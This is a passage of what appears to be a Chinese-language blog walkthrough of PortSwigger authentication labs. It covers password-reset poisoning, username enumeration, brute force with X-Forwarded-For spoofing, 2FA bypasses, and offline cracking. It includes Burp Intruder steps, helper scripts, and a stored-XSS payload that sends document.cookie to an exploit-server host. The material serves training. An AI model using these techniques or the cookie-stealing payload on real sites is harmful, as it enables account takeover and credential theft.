<p><img src="/images/image-20251116162205-lvi35wl.png" alt="image"><br>加载此URL并为Carlos的帐户设置一个新密码。<br>使用新密码登录Carlos的帐户以解决实验室问题。</p>
<p>因为攻击者的username设置为了受害者，所以邮件会被发到受害者的邮箱里面，网站使用了 <code>X-Forwarded-Host</code>​ 头中的恶意域名来作为链接的基准，它的主要作用是在请求通过一个或多个<strong>代理服务器</strong>（如负载均衡器、反向代理或CDN）到达最终的后端应用服务器时，告知后端应用<strong>原始客户端请求中使用的</strong> <strong>​<code>Host</code>​</strong>​ <strong>域名</strong>。</p>
<h2 id="3-4-Changing-user-passwords"><a href="#3-4-Changing-user-passwords" class="headerlink" title="3.4 Changing user passwords"></a>3.4 Changing user passwords</h2><p>通常，更改密码需要输入当前密码，然后两次输入新密码。这些页面基本上依赖于与普通登录页面相同的流程来检查用户名和当前密码是否匹配。因此，这些页面可能会受到相同技术的攻击。如果密码更改功能允许攻击者直接在未以受害者用户身份登录的情况下访问它，那么它可能会特别危险。例如，如果用户名是在隐藏字段中提供的，攻击者可能会在请求中编辑此值以针对任意用户。这可能会被利用来枚举用户名和暴力破解密码。</p>
<h3 id="3-4-1-Lab-Password-brute-force-via-password-change"><a href="#3-4-1-Lab-Password-brute-force-via-password-change" class="headerlink" title="3.4.1 Lab: Password brute-force via password change"></a>3.4.1 Lab: Password brute-force via password change</h3><p>这个实验室的密码修改功能很容易受到暴力攻击。要破解实验室，使用候选密码列表来破解卡洛斯的账户，并进入他的“我的账户”页面。</p>
<ul>
<li>Your credentials: <code>wiener:peter</code></li>
<li>Victim’s username: <code>carlos</code></li>
</ul>
<p>&#x3D;&#x3D;（并不是冲着改密码去的有referer头，重放不了，是去爆破密码的，因为可以基于错误判断）&#x3D;&#x3D;</p>
<ul>
<li><img src="/images/image-20251116165748-msmsk3b.png" alt="image"></li>
</ul>
<p><img src="/images/image-20251116165726-u1ybcds.png" alt="image"></p>
<h1 id="5-LAB"><a href="#5-LAB" class="headerlink" title="5.LAB:"></a>5.LAB:</h1><h2 id="Lab-Username-enumeration-via-response-timing"><a href="#Lab-Username-enumeration-via-response-timing" class="headerlink" title="Lab: Username enumeration via response timing"></a>Lab: Username enumeration via response timing</h2><p>直接爆破会被封IP——确定“X-Forwarded-For”头是受支持的，这使您可以欺骗您的IP地址，并绕过基于IP的暴力保护。</p>
<p><img src="/images/image-20251115125349-l268pwu.png" alt="image"></p>
<ol>
<li><p>尝试用户名和密码。特别要注意响应时间。请注意，当用户名无效时，响应时间大致相同。然而，当您输入有效的用户名（您自己的用户名）时，响应时间会根据您输入的长度而增加。</p>
</li>
<li><p>将此请求发送到Burp Intruder，并从攻击类型下拉菜单中选择“Pitchfork”攻击。添加“X-Forwarded-For”头。</p>
</li>
<li><p>为“X-Forwarded-For”头和用户名参数添加有效负载位置。将密码设置为一个非常长的字符字符串（大约100个字符应该可以）。</p>
</li>
<li><p>在“有效负载”侧边栏中，从“有效负载位置”下拉列表中选择位置1。选择“数字”有效负载类型。输入1-100的范围，并将步进设置为1。将最大小数位数设置为0。这将用于欺骗您的IP。</p>
</li>
<li><p>从“有效负载位置”下拉列表中选择位置2，然后添加用户名列表。开始攻击。</p>
</li>
<li><p>攻击完成后，在对话框的顶部，单击“列”，然后选择“接收到的响应”和“完成的响应”选项。这两列现在显示在结果表中。</p>
</li>
<li><p>请注意，其中一个响应时间明显比其他响应时间长。重复此请求几次，以确保它始终需要更长时间，然后记下此用户名。</p>
</li>
<li><p>为同一请求创建一个新的Burp Intruder攻击。再次添加“X-Forwarded-For”头，并为它添加一个有效负载位置。插入您刚刚确定的用户名，并为密码参数添加一个有效负载位置。</p>
</li>
<li><p>在“有效负载”侧边栏中，将数字列表添加到有效负载位置1，将密码列表添加到有效负载位置2。开始攻击。</p>
</li>
<li><p>攻击完成后，找到具有302状态的响应。记下此密码。</p>
</li>
<li><p>使用您确定的用户名和密码登录，访问用户帐户页面以解决实验室问题。</p>
</li>
</ol>
<p><img src="/images/image-20251115132119-fpvrynr.png" alt="image"></p>
<h2 id="Lab-Broken-brute-force-protection-IP-block-锁定模式存在问题"><a href="#Lab-Broken-brute-force-protection-IP-block-锁定模式存在问题" class="headerlink" title="Lab: Broken brute-force protection, IP block(锁定模式存在问题)"></a>Lab: Broken brute-force protection, IP block(锁定模式存在问题)</h2><p>可以尝试自己写一个脚本</p>
<p>‍</p>
<p>这个实验室由于其密码暴力保护中的一个逻辑缺陷而容易受到攻击。要解决这个实验室的问题，需要对受害者的密码进行暴力破解，然后登录并访问他们的账户页面。</p>
<p> • 您的凭证：wiener:peter</p>
<p>• 受害者的用户名：carlos • 候选密码</p>
<p>‍</p>
<ol>
<li>在运行 Burp 的情况下，检查登录页面。注意，如果您连续提交 3 次错误的登录信息，您的 IP 地址将被暂时封锁。但是，请注意，在达到此限制之前，您可以通过登录自己的账户来重置失败登录尝试的次数。</li>
<li>输入无效的用户名和密码，然后将 POST &#x2F;login 请求发送到 Burp Intruder。创建一个在用户名和密码参数中都有有效负载位置的 pitchfork 攻击。</li>
<li>单击“Resource pool”以打开“Resource pool”侧边栏，然后将攻击添加到“Maximum concurrent requests”设置为 1 的资源池中。通过一次只发送一个请求，您可以确保您的登录尝试按正确的顺序发送到服务器。</li>
<li>单击“Payloads”以打开“Payloads”侧边栏，然后从“Payload position”下拉列表中选择位置 1。添加一个在您的用户名和 carlos 之间交替的有效负载列表。确保您的用户名排在第一位，并且 carlos 至少重复 100 次。</li>
<li>编辑候选密码列表，并在每个密码之前添加您自己的密码。确保您的密码与另一个列表中的用户名对齐。<br>从“Payload position”下拉列表中选择位置 2，然后添加密码列表。开始攻击。</li>
<li>攻击完成后，过滤结果以隐藏状态码为 200 的响应。按用户名对剩余结果进行排序。应该只有一个用户名为 carlos 的请求的 302 响应。从“Payload 2”列中记下密码。</li>
<li>使用您确定的密码登录 Carlos 的账户，访问他的账户页面以解决实验室问题。</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload_username=[]</span><br><span class="line">file=<span class="built_in">open</span>(<span class="string">&quot;username.txt&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">    file.write(<span class="string">&quot;carlos\nwiener\n&quot;</span>)    </span><br><span class="line"></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20251115171506-5svg0ou.png" alt="image"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">file_path=<span class="string">r&quot;C:\Users\xxxxxxx\Desktop\password.txt&quot;</span></span><br><span class="line">output_file=<span class="string">r&quot;C:\Users\xxxxxxx\Desktop\new_password.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>)<span class="keyword">as</span> infile,<span class="built_in">open</span>(output_file,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>)<span class="keyword">as</span> outfile:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> infile:</span><br><span class="line">        outfile.write(line.rstrip(<span class="string">&quot;\n&quot;</span>)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        outfile.write(<span class="string">&quot;peter\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">infile.close()</span><br><span class="line">outfile.close()</span><br></pre></td></tr></table></figure>

<p>重点：缺陷模式需要控制发包的顺序——并发速度，而且需要会懂基础的脚本撰写。</p>
<h2 id="Lab-Username-enumeration-via-account-lock"><a href="#Lab-Username-enumeration-via-account-lock" class="headerlink" title="Lab: Username enumeration via account lock"></a>Lab: Username enumeration via account lock</h2><p>网站试图防止暴力破解的一种方法是，如果满足某些可疑条件（通常是登录失败的次数），就锁定帐户。与正常的登录错误一样，来自服务器的指示帐户被锁定的响应也可以帮助攻击者枚举用户名。</p>
<p>‍</p>
<ol>
<li>运行Burp Suite，调查登录页面并提交无效的用户名和密码。将POST &#x2F;login请求发送到Burp Intruder。</li>
<li>从攻击类型下拉菜单中选择“Cluster bomb attack”（集群炸弹攻击）。向用户名参数添加一个有效负载位置。通过单击“Add §”在请求正文的末尾添加一个空白有效负载位置。结果应该看起来像这样：username&#x3D;§invalid-username§&amp;password&#x3D;example§§。</li>
<li>在“Payloads”（有效负载）侧边栏中，为第一个有效负载位置添加用户名列表。对于第二个有效负载位置，选择“Null payloads”（空有效负载）类型，并选择生成5个有效负载的选项。这将有效地使每个用户名重复5次。开始攻击。</li>
<li>在结果中，注意到一个用户名的响应比其他用户名的响应要长。仔细研究响应，注意到它包含一个不同的错误消息：“您输入的登录信息有误”。记下这个用户名。</li>
<li>在POST &#x2F;login请求上创建一个新的Burp Intruder攻击，但这次从攻击类型下拉菜单中选择“Sniper attack”（狙击手攻击）。将用户名参数设置为刚刚确定的用户名，并向密码参数添加一个有效负载位置。</li>
<li>将密码列表添加到有效负载集中，并为错误消息创建一个grep提取规则。开始攻击。</li>
<li>在结果中，查看grep提取列。注意，有几个不同的错误消息，但其中一个响应不包含任何错误消息。记下这个密码。<br>等待一分钟以允许账户锁定重置。使用确定的用户名和密码登录，访问用户账户页面以解决实验室问题。</li>
</ol>
<p><img src="/images/image-20251115173125-ss5bg7t.png" alt="image"></p>
<p><img src="/images/image-20251115173613-78szps8.png" alt="image"></p>
<h2 id="Lab-2FA-simple-bypass"><a href="#Lab-2FA-simple-bypass" class="headerlink" title="Lab: 2FA simple bypass"></a>Lab: 2FA simple bypass</h2><p>这个实验室的双重认证是可以绕过的。您已经获得了有效的用户名和密码，但无法访问用户的2FA验证码。要解决实验室的问题，请访问卡洛斯的账户页面。</p>
<ul>
<li>Your credentials: <code>wiener:peter</code></li>
<li>Victim’s credentials <code>carlos:montoya</code></li>
</ul>
<p>‍</p>
<p>登录到您自己的账户。您的2FA验证码将通过电子邮件发送给您。单击“电子邮件客户端”按钮以访问您的电子邮件。</p>
<p><img src="/images/image-20251115185818-7j4772y.png" alt="image"></p>
<p><img src="/images/image-20251115185915-x9ppfwg.png" alt="image"><br>转到您的账户页面并记下URL。</p>
<p><img src="/images/image-20251115190137-43jvi3e.png" alt="image"><br>注销您的账户。<br>使用受害者的凭据登录。<br>当系统提示输入验证码时，手动更改URL以导航到&#x2F;my-account。页面加载时，实验即告解决。</p>
<p><img src="/images/image-20251115190151-mrbu8dq.png" alt="image"></p>
<p>‍</p>
<h2 id="Lab-2FA-bypass-using-a-brute-force-attack"><a href="#Lab-2FA-bypass-using-a-brute-force-attack" class="headerlink" title="Lab: 2FA bypass using a brute-force attack"></a>Lab: 2FA bypass using a brute-force attack</h2><p>网站会在输入错误的验证码后注销用户，但是可以通过宏来自动化登录。</p>
<p>‍</p>
<p>Victim’s credentials: <code>carlos:montoya</code></p>
<p>与密码一样，网站也需要采取措施来防止暴力破解双因素认证验证码。这一点尤为重要，因为验证码通常是一个简单的4位或6位数字。如果没有足够的暴力破解保护，破解这样的代码是微不足道的。</p>
<p>一些网站试图通过在用户输入一定数量的错误验证码后自动将其注销来防止这种情况。但在实践中这是无效的，因为高级攻击者甚至&#x3D;&#x3D;可以通过为Burp Intruder创建宏来自动化这个多步骤过程&#x3D;&#x3D;。Turbo Intruder扩展也可以用于此目的。</p>
<p>这个实验室的双因素认证容易受到暴力攻击。你已经获得了有效的用户名和密码，但没有访问用户的2FA验证码。为了解决这个实验室的问题，对2FA代码进行暴力破解，并访问Carlos的账户页面。</p>
<p>由于验证码将在您运行攻击时重置，因此您可能需要多次重复此攻击才能成功。这是因为新的代码可能是您当前的入侵者攻击已经尝试过的数字。</p>
<p>‍</p>
<p>‍</p>
<ol>
<li>在运行Burp的情况下，以carlos的身份登录并调查2FA验证过程。请注意，如果您两次输入错误的代码，您将再次被注销。您需要使用Burp的会话处理功能，在发送每个请求之前自动登录。</li>
<li>在Burp中，单击“设置”以打开“setting”对话框，然后单击“sessions”。在“session handling rules ”面板中，单击“add”。</li>
</ol>
<p><img src="/images/image-20251115195210-nsjmt2c.png" alt="image"><br>在对话框中，转到“范围”选项卡。在“URL范围”下，选择“包含所有URL”选项。</p>
<p><img src="/images/image-20251115195453-jhs9gl9.png" alt="image"><br>返回“详细信息”选项卡，在“规则操作”下，单击“添加”&gt;“运行宏”。</p>
<p>‍</p>
<p><img src="/images/image-20251115195527-dtwxdif.png" alt="image"><br>在“选择宏”下，单击“添加”以打开“宏记录器”。选择以下3个请求：然后单击“确定”。“宏编辑器”对话框将打开。要按住ctrl键来选择</p>
<p><img src="/images/image-20251115200747-ooqf5yi.png" alt="image"></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /login</span><br><span class="line">POST /login</span><br><span class="line">GET /login2</span><br></pre></td></tr></table></figure>

<p>单击“测试宏”，并检查最终响应是否包含要求您提供4位数安全代码的页面。这将确认宏工作正常。</p>
<p><img src="/images/image-20251115201831-7j9gils.png" alt="image">​<br>继续单击“确定”以关闭各个对话框，直到返回Burp主窗口。&#x3D;&#x3D;现在，在Burp Intruder发送每个请求之前，宏将自动为您登录Carlos。&#x3D;&#x3D;</p>
<p>‍</p>
<p>将POST &#x2F;login2请求发送到Burp Intruder。</p>
<p><img src="/images/image-20251115202005-x1u905l.png" alt="image"><br>在Burp Intruder中，向mfa-code参数添加一个有效负载位置。<br>在“有效负载”侧边栏中，选择“数字”有效负载类型。输入范围0 - 9999，并将步进设置为1。将最小&#x2F;最大整数位数设置为4，最大小数位数设置为0。这将为每个可能的4位数整数创建一个有效负载。<br>单击“资源池”以打开“资源池”侧边栏。将攻击添加到“最大并发请求”设置为1的资源池中。<br>开始攻击。最终，其中一个请求将返回302状态代码。右键单击此请求，然后选择“在浏览器中显示响应”。复制URL并在浏览器中加载。</p>
<p><img src="/images/image-20251115202257-m1hnhli.png" alt="image"><br>单击“我的账户”以解决实验室问题。</p>
<p><img src="/images/image-20251115220858-i7bd627.png" alt="image"></p>
<h2 id="Lab-Offline-password-cracking"><a href="#Lab-Offline-password-cracking" class="headerlink" title="Lab: Offline password cracking"></a>Lab: Offline password cracking</h2><p>本实验室将用户的密码散列存储在cookie中。该实验室在评论功能中还包含一个XSS漏洞。要破解实验室，获取carlos的永久登录cookie并使用它来破解他的密码。然后，以carlos的身份登录，并从“我的帐户”页面删除他的帐户。</p>
<ul>
<li>Your credentials: <code>wiener:peter</code></li>
<li>Victim’s username: <code>carlos</code></li>
</ul>
<p><img src="/images/image-20251116145936-ptopecr.png" alt="image"></p>
<ol>
<li>在运行 Burp 的情况下，使用您自己的账户来检查“保持登录”功能。请注意，保持登录的 cookie 是经过 Base64 编码的。<br>在“代理”&gt;“HTTP 历史记录”选项卡中，转到您登录请求的响应，并突出显示“保持登录”cookie，以查看其构造如下：username ‘:’ md5HashOfPassword</li>
</ol>
<p><img src="/images/image-20251116150256-4292dx5.png" alt="image"></p>
<ol start="2">
<li>您现在需要窃取受害者用户的 cookie。请注意，评论功能容易受到 XSS 攻击。<br>记下回传的地址：<a target="_blank" rel="noopener" href="https://exploit-0a85001a0416728c80b92a9601d100df.exploit-server.net/">https://exploit-0a85001a0416728c80b92a9601d100df.exploit-server.net/</a></li>
<li>转到其中一个博客，并发布一个包含以下存储型 XSS 有效负载的评论，请记住输入您自己的攻击服务器 ID：</li>
</ol>
<p>​<code>&lt;script&gt;document.location=&#39;https://exploit-0a85001a0416728c80b92a9601d100df.exploit-server.net/exploit&#39;+document.cookie</code></script></p>
<p><img src="/images/image-20251116151923-b4xjyy3.png" alt="image"><br>在攻击服务器上，打开访问日志。应该有一个来自受害者的 GET 请求，其中包含他们的“保持登录”cookie。</p>
<p><img src="/images/image-20251116152225-u58re5e.png" alt="image"><br>在 Burp 解码器中解码 cookie。结果将是：carlos:26323c16d5f4dabff3bb136f2460a943<br>复制哈希值并将其粘贴到搜索引擎中。这将显示密码是 onceuponatime。<br>登录受害者的账户，转到“我的账户”页面，然后删除他们的账户以解决实验室问题。</p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>‍</p>
<p>‍</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2026/01/12/Authentication%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/" data-id="cmkbf3udr0000ewvs12j9adbg" data-title="2.Authentication身份验证" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2026/01/19/Server-side%20request%20forgery%20(SSRF)/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          3.Server-side request forgery (SSRF)
        
      </div>
    </a>
  
  
    <a href="/2026/01/08/%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">1.路径穿越</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/portswigger/">portswigger</a></li></ul>
    </div>
  </div>


  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/01/">January 2026</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2026/01/23/API%20testing/">5.API testing</a>
          </li>
        
          <li>
            <a href="/2026/01/22/Business%20logic%20vulnerabilities/">4.Business logic vulnerabilities</a>
          </li>
        
          <li>
            <a href="/2026/01/19/Server-side%20request%20forgery%20(SSRF)/">3.Server-side request forgery (SSRF)</a>
          </li>
        
          <li>
            <a href="/2026/01/12/Authentication%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/">2.Authentication身份验证</a>
          </li>
        
          <li>
            <a href="/2026/01/08/%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/">1.路径穿越</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2026 hr1sto<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>